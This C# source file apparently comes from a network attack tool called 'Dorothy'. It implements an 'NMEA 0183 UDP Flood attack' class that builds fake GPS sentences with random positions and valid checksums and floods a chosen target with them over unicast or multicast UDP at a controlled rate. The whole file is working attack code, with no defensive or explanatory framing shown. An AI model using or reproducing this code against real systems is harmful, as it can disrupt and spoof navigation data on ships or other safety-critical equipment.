using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{

    public class Nmea0183UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private readonly bool _isMulticast;
        private Socket? _socket;
        private readonly Random _random = new Random();
        public event EventHandler<PacketEventArgs>? PacketSent;

        public Nmea0183UdpFlood(PacketParameters parameters, CancellationToken cancellationToken, bool isMulticast = false)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
            _isMulticast = isMulticast;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        private string GenerateNmeaSentence()
        {
            var sentenceType = _random.Next(0, 3) switch
            {
                0 => "GPGGA",
                1 => "GPRMC",
                _ => "GPGLL"
            };

            var utcTime = DateTime.UtcNow.ToString("HHmmss.fff");
            var latitude = $"{_random.Next(0, 90):D2}{_random.Next(0, 60):D2}.{_random.Next(0, 9999):D4}";
            var latDir = _random.Next(0, 2) == 0 ? "N" : "S";
            var longitude = $"{_random.Next(0, 180):D3}{_random.Next(0, 60):D2}.{_random.Next(0, 9999):D4}";
            var lonDir = _random.Next(0, 2) == 0 ? "E" : "W";
            var quality = _random.Next(1, 9);
            var satellites = _random.Next(4, 12);
            var hdop = $"{_random.Next(0, 20):D1}.{_random.Next(0, 9):D1}";
            var altitude = $"{_random.Next(0, 10000):D1}.{_random.Next(0, 9):D1}";
            var speed = $"{_random.Next(0, 50):D1}.{_random.Next(0, 9):D1}";
            var course = $"{_random.Next(0, 360):D3}.{_random.Next(0, 9):D1}";
            var date = DateTime.UtcNow.ToString("ddMMyy");

            return sentenceType switch
            {
                "GPGGA" => $"$GPGGA,{utcTime},{latitude},{latDir},{longitude},{lonDir},{quality},{satellites},{hdop},{altitude},M,{altitude},M,,*{CalculateNmeaChecksum($"GPGGA,{utcTime},{latitude},{latDir},{longitude},{lonDir},{quality},{satellites},{hdop},{altitude},M,{altitude},M,,"):X2}",
                "GPRMC" => $"$GPRMC,{utcTime},A,{latitude},{latDir},{longitude},{lonDir},{speed},{course},{date},,A*{CalculateNmeaChecksum($"GPRMC,{utcTime},A,{latitude},{latDir},{longitude},{lonDir},{speed},{course},{date},,A"):X2}",
                "GPGLL" => $"$GPGLL,{latitude},{latDir},{longitude},{lonDir},{utcTime},A*{CalculateNmeaChecksum($"GPGLL,{latitude},{latDir},{longitude},{lonDir},{utcTime},A"):X2}",
                _ => $"$GPGGA,{utcTime},{latitude},{latDir},{longitude},{lonDir},{quality},{satellites},{hdop},{altitude},M,{altitude},M,,*{CalculateNmeaChecksum($"GPGGA,{utcTime},{latitude},{latDir},{longitude},{lonDir},{quality},{satellites},{hdop},{altitude},M,{altitude},M,,"):X2}"
            };
        }

        private byte CalculateNmeaChecksum(string sentence)
        {
            byte checksum = 0;
            foreach (char c in sentence)
            {
                checksum ^= (byte)c;
            }
            return checksum;
        }

        private byte[] GenerateNmeaPayload(int maxSize = 1400)
        {
            var sentences = new System.Collections.Generic.List<string>();
            int totalLength = 0;

            while (totalLength < maxSize - 100)
            {
                var sentence = GenerateNmeaSentence() + "\r\n";
                if (totalLength + Encoding.ASCII.GetByteCount(sentence) > maxSize)
                    break;

                sentences.Add(sentence);
                totalLength += Encoding.ASCII.GetByteCount(sentence);
            }

            if (sentences.Count == 0)
            {
                sentences.Add(GenerateNmeaSentence() + "\r\n");
            }

            var payload = string.Join("", sentences);
            var payloadBytes = Encoding.ASCII.GetBytes(payload);

            if (payloadBytes.Length < maxSize)
            {
                var padded = new byte[maxSize];
                Array.Copy(payloadBytes, padded, payloadBytes.Length);

                return padded;
            }

            return payloadBytes;
        }

        public async Task StartAsync()
        {
            Logger.Info($"Starting NMEA 0183 UDP Flood attack ({( _isMulticast ? "Multicast" : "Unicast")}).");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, System.Net.Sockets.ProtocolType.Udp);

                if (_isMulticast)
                {

                    _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.MulticastTimeToLive, 1);

                    var multicastIp = _params.DestinationIp;
                    if (multicastIp.AddressFamily == AddressFamily.InterNetwork)
                    {
                        _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.AddMembership,
                            new MulticastOption(multicastIp));
                    }
                }

                byte[] udpHeader = new byte[8];

                int typicalPayloadSize = 200;
                int typicalPacketSize = 14 + 20 + udpHeader.Length + typicalPayloadSize + 4;

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    var endpoint = new IPEndPoint(_params.DestinationIp, _params.DestinationPort);

                    long bytesSent = 0;
                    long targetBytesPerSecond = _params.BytesPerSecond;
                    double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;

                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500;
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3;

                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0;

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {

                        if (_cancellationToken.IsCancellationRequested)
                        {
                            break;
                        }

                        try
                        {

                            var payload = GenerateNmeaPayload(typicalPayloadSize);
                            int actualPayloadSize = payload.Length;

                            int actualPacketSize = 14 + 20 + udpHeader.Length + actualPayloadSize + 4;

                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);

                            if (bytesSent < allowedBytes)
                            {

                                long bytesBehind = allowedBytes - bytesSent;
                                int packetsToSend = Math.Min((int)(bytesBehind / typicalPacketSize) + 1, 5);

                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes && !_cancellationToken.IsCancellationRequested; i++)
                                {

                                    payload = GenerateNmeaPayload(typicalPayloadSize);
                                    actualPayloadSize = payload.Length;

                                    actualPacketSize = 14 + 20 + udpHeader.Length + actualPayloadSize + 4;

                                    BitConverter.GetBytes((ushort)_params.SourcePort).CopyTo(udpHeader, 0);
                                    BitConverter.GetBytes((ushort)_params.DestinationPort).CopyTo(udpHeader, 2);
                                    BitConverter.GetBytes((ushort)(8 + actualPayloadSize)).CopyTo(udpHeader, 4);
                                    BitConverter.GetBytes((ushort)0).CopyTo(udpHeader, 6);

                                    byte[] fullPacket = new byte[udpHeader.Length + actualPayloadSize];
                                    Buffer.BlockCopy(udpHeader, 0, fullPacket, 0, udpHeader.Length);
                                    Buffer.BlockCopy(payload, 0, fullPacket, udpHeader.Length, actualPayloadSize);

                                    _socket.SendTo(fullPacket, endpoint);
                                    OnPacketSent(fullPacket, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);

                                    bytesSent += actualPacketSize;
                                }
                            }
                            else
                            {

                                if (isLowRate && sleepCounter++ % 10 == 0)
                                {

                                    Thread.Sleep(0);
                                }
                                else
                                {

                                    Thread.SpinWait(10);
                                }
                            }

                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;

                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);

                                if (smoothedActualMbps == 0)
                                    smoothedActualMbps = actualMbps;
                                else
                                    smoothedActualMbps = (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);

                                Logger.Info($"NMEA 0183 UDP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");

                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending NMEA 0183 UDP packet.");
                        }
                    }
                }, _cancellationToken);

                if (_cancellationToken.IsCancellationRequested)
                {
                    Logger.Info("NMEA 0183 attack cancelled, closing socket.");
                }
            }
            catch (OperationCanceledException)
            {
                Logger.Info("NMEA 0183 attack was cancelled.");

            }
            catch (Exception ex)
            {
                Logger.Error(ex, "NMEA 0183 UDP Flood attack failed.");
                throw;
            }
            finally
            {

                if (_socket != null)
                {
                    try
                    {
                        _socket.Close();
                    }
                    catch (Exception ex)
                    {
                        Logger.Warn($"Error closing socket: {ex.Message}");
                    }
                }
            }
        }

        public void Dispose()
        {
            if (_socket != null && _isMulticast)
            {
                try
                {

                    var multicastIp = _params.DestinationIp;
                    if (multicastIp.AddressFamily == AddressFamily.InterNetwork)
                    {
                        _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.DropMembership,
                            new MulticastOption(multicastIp));
                    }
                }
                catch (Exception ex)
                {
                    Logger.Warn($"Error leaving multicast group: {ex.Message}");
                }
            }
            _socket?.Dispose();
        }
    }
}

